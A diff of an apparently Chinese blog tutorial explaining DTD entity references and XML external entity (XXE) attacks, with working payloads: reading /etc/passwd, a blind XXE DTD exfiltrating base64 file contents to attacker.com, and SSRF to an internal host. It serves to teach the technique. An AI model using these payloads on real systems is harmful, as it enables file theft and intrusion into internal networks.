+<h2 id="DTD-实体的引用"><a href="#DTD-实体的引用" class="headerlink" title="DTD 实体的引用"></a>DTD 实体的引用</h2><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><p>在 XML 中，一些字符拥有特殊的意义，如果把这些直接放进 XML 元素中会产生错误。为了避免这个错误，我们可以用实体引用来替代这些特殊的字符。比如在 XML 中有 5 个预定义的实体引用：</p>
 <ul>
-<li><strong><code>&amp;amp;</code></strong>：表示字符
-<code>&amp;</code>，用于表示与符号。</li>
-<li><strong><code>&amp;lt;</code></strong>：表示字符
-<code>&lt;</code>，用于表示小于号。</li>
-<li><strong><code>&amp;gt;</code></strong>：表示字符
-<code>&gt;</code>，用于表示大于号。</li>
-<li><strong><code>&amp;quot;</code></strong>：表示字符
-<code>"</code>，用于表示双引号。</li>
-<li><strong><code>&amp;apos;</code></strong>：表示字符
-<code>'</code>，用于表示单引号。</li>
+<li>**<code>&amp;amp;</code>**：表示字符 <code>&amp;</code>，用于表示与符号。</li>
+<li>**<code>&amp;lt;</code>**：表示字符 <code>&lt;</code>，用于表示小于号。</li>
+<li>**<code>&amp;gt;</code>**：表示字符 <code>&gt;</code>，用于表示大于号。</li>
+<li>**<code>&amp;quot;</code>**：表示字符 <code>&quot;</code>，用于表示双引号。</li>
+<li>**<code>&amp;apos;</code>**：表示字符 <code>&#39;</code>，用于表示单引号。</li>
 </ul>
-<p>另外在 DTD
-中，还有一些字符也是有特殊含义的，因此如果是要将参数实体引用到 DTD
-中除了前面提到的 5
-个预定义的实体引用外，还需要将参数实体的值中的一些特殊字符进行转义：</p>
+<p>另外在 DTD 中，还有一些字符也是有特殊含义的，因此如果是要将参数实体引用到 DTD 中除了前面提到的 5 个预定义的实体引用外，还需要将参数实体的值中的一些特殊字符进行转义：</p>
 <ul>
-<li><strong><code>%</code></strong>：引用参数实体的标记，需要转义为
-<code>&amp;#x25;</code> 。</li>
-<li><strong><code>;</code></strong>：表示实体引用的结束符。<strong>这个符号不需要转义，但必须正确使用。</strong></li>
+<li>**<code>%</code>**：引用参数实体的标记，需要转义为 <code>&amp;#x25;</code> 。</li>
+<li><strong><code>;</code><strong>：表示实体引用的结束符。</strong>这个符号不需要转义，但必须正确使用。</strong></li>
 </ul>
-<h3 id="引用普通实体">引用普通实体</h3>
-<p>普通实体引用是通过 <code>&amp;</code>
-符号进行的。引用实体时，需要使用实体名，并以 <code>;</code> 结束。</p>
+<h3 id="引用普通实体"><a href="#引用普通实体" class="headerlink" title="引用普通实体"></a>引用普通实体</h3><p>普通实体引用是通过 <code>&amp;</code> 符号进行的。引用实体时，需要使用实体名，并以 <code>;</code> 结束。</p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">author</span> <span class="string">&quot;John Doe&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">logo</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://www.example.com/logo.png&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span><span class="symbol">&amp;author;</span><span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jane<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting tomorrow!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;<span class="symbol">&amp;logo;</span>&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
 <p>在上述示例中：</p>
 <ul>
-<li><code>&amp;author;</code> 引用内部实体 <code>author</code>，其值为
-<code>John Doe</code>。</li>
-<li><code>&amp;logo;</code> 引用外部实体 <code>logo</code>，其值为
-<code>logo.png</code>。</li>
+<li><code>&amp;author;</code> 引用内部实体 <code>author</code>，其值为 <code>John Doe</code>。</li>
+<li><code>&amp;logo;</code> 引用外部实体 <code>logo</code>，其值为 <code>logo.png</code>。</li>
 </ul>
-<h3 id="引用参数实体">引用参数实体</h3>
-<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">part1</span> <span class="string">&quot;&lt;to&gt;John&lt;/to&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">part2</span> <span class="string">&quot;&lt;from&gt;Jane&lt;/from&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">part3</span> <span class="string">&quot;&lt;heading&gt;Meeting Reminder&lt;/heading&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">part4</span> <span class="string">&quot;&lt;body&gt;Don&#x27;t forget the meeting tomorrow!&lt;/body&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (%<span class="keyword">part1</span>;, %<span class="keyword">part2</span>;, %<span class="keyword">part3</span>;, %<span class="keyword">part4</span>;)&gt;</span></span><br></pre></td></tr></table></figure></div>
-<p>在上述示例中，参数实体
-<code>%part1;</code>、<code>%part2;</code>、<code>%part3;</code> 和
-<code>%part4;</code> 分别定义了
-<code>to</code>、<code>from</code>、<code>heading</code> 和
-<code>body</code> 元素，便于在 DTD 中重用。</p>
+<h3 id="引用参数实体"><a href="#引用参数实体" class="headerlink" title="引用参数实体"></a>引用参数实体</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">part1</span> <span class="string">&quot;&lt;to&gt;John&lt;/to&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">part2</span> <span class="string">&quot;&lt;from&gt;Jane&lt;/from&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">part3</span> <span class="string">&quot;&lt;heading&gt;Meeting Reminder&lt;/heading&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">part4</span> <span class="string">&quot;&lt;body&gt;Don&#x27;t forget the meeting tomorrow!&lt;/body&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (%<span class="keyword">part1</span>;, %<span class="keyword">part2</span>;, %<span class="keyword">part3</span>;, %<span class="keyword">part4</span>;)&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>在上述示例中，参数实体 <code>%part1;</code>、<code>%part2;</code>、<code>%part3;</code> 和 <code>%part4;</code> 分别定义了 <code>to</code>、<code>from</code>、<code>heading</code> 和 <code>body</code> 元素，便于在 DTD 中重用。</p>
 <p><strong>参数实体的引用有如下特点：</strong></p>
 <ul>
-<li><p>对于 XML 内部 DTD
-声明，无论是内部参数实体还是外部参数实体，只有独立引用可以正确引用，而在外部实体的
-URI 或内部的值中引用都会引用失败。 <img  
-
+<li><p>对于 XML 内部 DTD 声明，无论是内部参数实体还是外部参数实体，只有独立引用可以正确引用，而在外部实体的 URI 或内部的值中引用都会引用失败。<br><img   
                      lazyload
                      src="/images/loading.svg"
                      data-
                      lazyload
                      src="/images/loading.svg"
-                     data-src="images/7527adf8bc1eba7459bc42b5c1cb87a8.png"
+                     data-src="/2024/11/09/XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/images/7527adf8bc1eba7459bc42b5c1cb87a8.png"
                      
-                      
+                     
                 
-                ></p></li>
-<li><p>对于外部 DTD 声明限制比较宽松，除了外部实体的 URL
-外都可引用。其中可以引用参数实体的内部实体可以是参数实体。 <img  
-
+                ></p>
+</li>
+<li><p>对于外部 DTD 声明限制比较宽松，除了外部实体的 URL 外都可引用。其中可以引用参数实体的内部实体可以是参数实体。<br><img   
                      lazyload
                      src="/images/loading.svg"
                      data-
                      lazyload
                      src="/images/loading.svg"
-                     data-src="images/3e436224123445383b225f10b316e3d9.png"
+                     data-src="/2024/11/09/XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/images/3e436224123445383b225f10b316e3d9.png"
                      
-                      
+                     
                 
-                >
-<strong>注意对于「URI 中引用参数实体的内部参数实体」这里 URI
-中引用参数实体是否有限制取决于定义「URI
-中引用参数实体的内部参数实体」的定义位置，而不是「URI
-中引用参数实体的内部参数实体」的引用位置。</strong></p>
-<p>当然这种特性也可以理解为：如果发生在「内部 DTD 声明」中引用「URI
-中引用参数实体的内部参数实体」那么说明「URI
-中引用参数实体的内部参数实体」所在的外部 DTD
-已经通过「外部实体」引用到「内部 DTD 声明」中了，因此「URI
-中引用参数实体的内部参数实体」无论引用到外部 DTD 还是「内部 DTD
-声明」中都是等价的。</p>
+                ><br><strong>注意对于「URI 中引用参数实体的内部参数实体」这里 URI 中引用参数实体是否有限制取决于定义「URI 中引用参数实体的内部参数实体」的定义位置，而不是「URI 中引用参数实体的内部参数实体」的引用位置。</strong> </p>
+<p>当然这种特性也可以理解为：如果发生在「内部 DTD 声明」中引用「URI 中引用参数实体的内部参数实体」那么说明「URI 中引用参数实体的内部参数实体」所在的外部 DTD 已经通过「外部实体」引用到「内部 DTD 声明」中了，因此「URI 中引用参数实体的内部参数实体」无论引用到外部 DTD 还是「内部 DTD 声明」中都是等价的。</p>
 <ul>
-<li><strong>外部 DTD 声明</strong>与<strong>外部参数声明引用外部
-DTD</strong> 在功能上等价。</li>
+<li><strong>外部 DTD 声明</strong>与<strong>外部参数声明引用外部 DTD</strong> 在功能上等价。</li>
 </ul>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">internal_impl</span> [</span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY % <span class="keyword">local_external_arg</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://example.com/external.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">        %local_external_arg;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">external_impl</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://example.com/external.dtd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-<p>不过「外部参数声明引用外部
-DTD」这种方法可以（部分）无视程序中「禁用外部 DTD
-声明」的限制，另外这种方法相当于将外部的 DTD
-内联进来，因此可以在接下来引用外部 DTD
-中的参数实体，但在引用参数实体的限制上方面与内部 DTD
-声明同样严格。</p></li>
+
+<p>不过「外部参数声明引用外部 DTD」这种方法可以（部分）无视程序中「禁用外部 DTD 声明」的限制，另外这种方法相当于将外部的 DTD 内联进来，因此可以在接下来引用外部 DTD 中的参数实体，但在引用参数实体的限制上方面与内部 DTD 声明同样严格。</p>
+</li>
 <li><p>另外参数实体引用还有一个坑点，<strong>如果是独立引用两个参数实体写在一行中间必须要有空格分隔开</strong>，例如：</p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%参数实体1; %参数实体2;</span><br></pre></td></tr></table></figure></div></li>
 </ul>
-<h1 id="xml-外部实体注入">XML 外部实体注入</h1>
-<p>XML 外部实体注入（XML External Entity Injection，简称
-XXE）是一种攻击技术，利用 XML
-解析器在解析外部实体时的漏洞，执行恶意操作。攻击者可以通过 XXE
-攻击读取文件系统中的敏感信息、进行网络探测、甚至执行远程代码。</p>
-<h2 id="xml-注入方法">XML 注入方法</h2>
-<h3 id="外部-dtd-声明注入">外部 DTD 声明注入</h3>
-<p>通过外部 DTD 声明引入 DTD 然后将引入的 DTD 的实体注入到 XML
-代码中。</p>
-<p>这里举一个任意文件读的例子。首先发送的 XML 文本如下，其中有一个外部
-DTD 声明指向了 <code>http://attacker.com/xxe.dtd</code> 。</p>
+<h1 id="XML-外部实体注入"><a href="#XML-外部实体注入" class="headerlink" title="XML 外部实体注入"></a>XML 外部实体注入</h1><p>XML 外部实体注入（XML External Entity Injection，简称 XXE）是一种攻击技术，利用 XML 解析器在解析外部实体时的漏洞，执行恶意操作。攻击者可以通过 XXE 攻击读取文件系统中的敏感信息、进行网络探测、甚至执行远程代码。</p>
+<h2 id="XML-注入方法"><a href="#XML-注入方法" class="headerlink" title="XML 注入方法"></a>XML 注入方法</h2><h3 id="外部-DTD-声明注入"><a href="#外部-DTD-声明注入" class="headerlink" title="外部 DTD 声明注入"></a>外部 DTD 声明注入</h3><p>通过外部 DTD 声明引入 DTD 然后将引入的 DTD 的实体注入到 XML 代码中。</p>
+<p>这里举一个任意文件读的例子。首先发送的 XML 文本如下，其中有一个外部 DTD 声明指向了 <code>http://attacker.com/xxe.dtd</code> 。</p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/xxe.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-<p><code>http://attacker.com/xxe.dtd</code> 中有一个外部实体，值为
-<code>/etc/passwd</code> 的文件内容。</p>
+
+<p><code>http://attacker.com/xxe.dtd</code> 中有一个外部实体，值为 <code>/etc/passwd</code> 的文件内容。</p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-<p>如果提交 XML 文档后服务器会回显其解析后的内容则能够成功读取
-<code>/etc/passwd</code> 的文件。</p>
-<h3 id="外部实体注入">外部实体注入</h3>
-<p>外部实体注入可以适用于一些限制外部 DTD 声明注入的情境。我们直接在 XML
-文档中添加内部 DTD 声明，然后在内部 DTD
-声明中添加外部实体即可。效果与外部 DTD 声明注入相同。</p>
+
+<p>如果提交 XML 文档后服务器会回显其解析后的内容则能够成功读取 <code>/etc/passwd</code> 的文件。</p>
+<h3 id="外部实体注入"><a href="#外部实体注入" class="headerlink" title="外部实体注入"></a>外部实体注入</h3><p>外部实体注入可以适用于一些限制外部 DTD 声明注入的情境。我们直接在 XML 文档中添加内部 DTD 声明，然后在内部 DTD 声明中添加外部实体即可。效果与外部 DTD 声明注入相同。</p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-<h3 id="blind-xxe">Blind XXE</h3>
-<p>如果提交 XML 文档后服务器不会回显其解析后的内容，那么需要利用 XML
-解析时的特性来将数据回传，这就是 Blind XXE 技术。</p>
-<p><strong>Blind XXE 技术依赖于参数实体引用</strong>，因为Blind XXE
-技术的本质就是<strong>通过参数实体引用把要回传的数据替换到另一个外部参数实体
-URL 参数中实现数据回传</strong>。</p>
-<p>为了能够做到这一点，根据参数实体引用的特性，我们首先需要将<strong>参数实体引用</strong>定义到外部
-DTD（<strong>内部 DTD 声明中不能在内部实体的值中引入参数实体，外部 DTD
-没有这个限制</strong>），然后利用外部实体注入（也可以使用外部 DTD
-声明注入，只不过外部实体注入适用范围更广）将该 DTD 引入 XML 文档。</p>
+
+<h3 id="Blind-XXE"><a href="#Blind-XXE" class="headerlink" title="Blind XXE"></a>Blind XXE</h3><p>如果提交 XML 文档后服务器不会回显其解析后的内容，那么需要利用 XML 解析时的特性来将数据回传，这就是 Blind XXE 技术。</p>
+<p><strong>Blind XXE 技术依赖于参数实体引用</strong>，因为Blind XXE 技术的本质就是<strong>通过参数实体引用把要回传的数据替换到另一个外部参数实体 URL 参数中实现数据回传</strong>。</p>
+<p>为了能够做到这一点，根据参数实体引用的特性，我们首先需要将<strong>参数实体引用</strong>定义到外部 DTD（<strong>内部 DTD 声明中不能在内部实体的值中引入参数实体，外部 DTD 没有这个限制</strong>），然后利用外部实体注入（也可以使用外部 DTD 声明注入，只不过外部实体注入适用范围更广）将该 DTD 引入 XML 文档。</p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY %xxe <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/xxe.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  % xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-<p>在 <code>xxe.dtd</code> 中我们定义了 <code>%read</code>
-参数实体，引用该实体就能将目标文件内容的 base64 形式替换到引用处。</p>
-<p>根据参数实体引用的特性，即便是外部 DTD 也不能在 URI
-中引用参数实体，因此需要先将外部实体 <code>%send</code>
-用另一个内部参数实体 <code>%write</code> 表示，这样就可以将
-<code>%send</code> 对应的值替换到 <code>%write</code> 表示的外部实体
-<code>%send</code> 的 URL 中。</p>
-<p>在 DTD 中引用 <code>%write</code> 就可以将替换后的外部实体
-<code>%send</code> 引入到 DTD 文档中。</p>
-<p>这里假定 <code>%send</code> 是参数实体，那么在 DTD 中引用
-<code>%send</code> 则 XML 解析器就会根据 <code>%send</code> 对应的 URI
-取请求 <code>%send</code> 的值，在这个过程中 <code>%read</code>
-的值作为参数传到了 <code>www.attacker.com</code>。</p>
+
+<p>在 <code>xxe.dtd</code> 中我们定义了 <code>%read</code> 参数实体，引用该实体就能将目标文件内容的 base64 形式替换到引用处。</p>
+<p>根据参数实体引用的特性，即便是外部 DTD 也不能在 URI 中引用参数实体，因此需要先将外部实体 <code>%send</code> 用另一个内部参数实体 <code>%write</code> 表示，这样就可以将 <code>%send</code> 对应的值替换到 <code>%write</code> 表示的外部实体 <code>%send</code> 的 URL 中。</p>
+<p>在 DTD 中引用 <code>%write</code> 就可以将替换后的外部实体 <code>%send</code> 引入到 DTD 文档中。</p>
+<p>这里假定 <code>%send</code> 是参数实体，那么在 DTD 中引用 <code>%send</code> 则 XML 解析器就会根据 <code>%send</code> 对应的 URI 取请求 <code>%send</code> 的值，在这个过程中 <code>%read</code> 的值作为参数传到了 <code>www.attacker.com</code>。</p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">read</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">write</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://attacker.com/?leak=%read;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%write; %send;</span><br></pre></td></tr></table></figure></div>
+
 <p>在理解原理之后我们可以很轻松的写出上述 payload 的一些变种。</p>
 <p>例如我们可以将 <code>send</code> 由参数实体改为普通实体：</p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">write</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://attacker.com/?leak=%read;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-<p>此时我们只需要在 XML 文档中引用 <code>send</code>
-就可以实现同样效果：</p>
+
+<p>此时我们只需要在 XML 文档中引用 <code>send</code> 就可以实现同样效果：</p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-<p>根据参数实体引用的特性，引用参数实体的时机也不是那么固定，我们可以在
-XML 中的内部 DTD 声明中引用 <code>%write</code> 和
-<code>%send</code>，但是要确保引用 <code>%send</code> 前
-<code>%write</code> 已经在外部 DTD 或者 XML 中已经被引用过了。</p>
+
+<p>根据参数实体引用的特性，引用参数实体的时机也不是那么固定，我们可以在 XML 中的内部 DTD 声明中引用 <code>%write</code> 和 <code>%send</code>，但是要确保引用 <code>%send</code> 前 <code>%write</code> 已经在外部 DTD 或者 XML 中已经被引用过了。</p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY %xxe <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/xxe.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  % xxe; %write; %send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></div>
-<h2 id="xml-注入应用">XML 注入应用</h2>
-<p>XXE 的核心就是泄露，因此下面介绍的主要是在有任意 URI
-读取的情况下我们可以做什么。</p>
-<h3 id="文件泄露攻击">文件泄露攻击</h3>
-<p>文件泄露攻击是 XXE
-攻击中最常见的一种。攻击者通过注入一个外部实体，该实体指向服务器上的文件。解析器在解析这个外部实体时，会将文件的内容返回给攻击者。</p>
+
+<h2 id="XML-注入应用"><a href="#XML-注入应用" class="headerlink" title="XML 注入应用"></a>XML 注入应用</h2><p>XXE 的核心就是泄露，因此下面介绍的主要是在有任意 URI 读取的情况下我们可以做什么。</p>
+<h3 id="文件泄露攻击"><a href="#文件泄露攻击" class="headerlink" title="文件泄露攻击"></a>文件泄露攻击</h3><p>文件泄露攻击是 XXE 攻击中最常见的一种。攻击者通过注入一个外部实体，该实体指向服务器上的文件。解析器在解析这个外部实体时，会将文件的内容返回给攻击者。</p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-<p>这个 XML 文档会尝试读取服务器上的 <code>/etc/passwd</code>
-文件，并将其内容包含在返回的 XML 文档中。</p>
-<h3 id="服务器端请求伪造ssrf">服务器端请求伪造（SSRF）</h3>
-<p>服务器端请求伪造攻击利用
-XXE，使解析器向内网或其他服务器发送请求。攻击者可以利用这种方式访问内网服务或进行其他网络攻击。</p>
+
+<p>这个 XML 文档会尝试读取服务器上的 <code>/etc/passwd</code> 文件，并将其内容包含在返回的 XML 文档中。</p>
+<h3 id="服务器端请求伪造（SSRF）"><a href="#服务器端请求伪造（SSRF）" class="headerlink" title="服务器端请求伪造（SSRF）"></a>服务器端请求伪造（SSRF）</h3><p>服务器端请求伪造攻击利用 XXE，使解析器向内网或其他服务器发送请求。攻击者可以利用这种方式访问内网服务或进行其他网络攻击。</p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://internal-service.local/secret&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-<p>这个 XML 文档会使解析器向
-<code>http://internal-service.local/secret</code>
-发送请求，并将响应包含在返回的XML文档中。</p>
-<h3 id="本地端口扫描">本地端口扫描</h3>
-<p>攻击者可以利用XXE来使服务器对其自身进行端口扫描，以检测内部网络服务。</p>
+
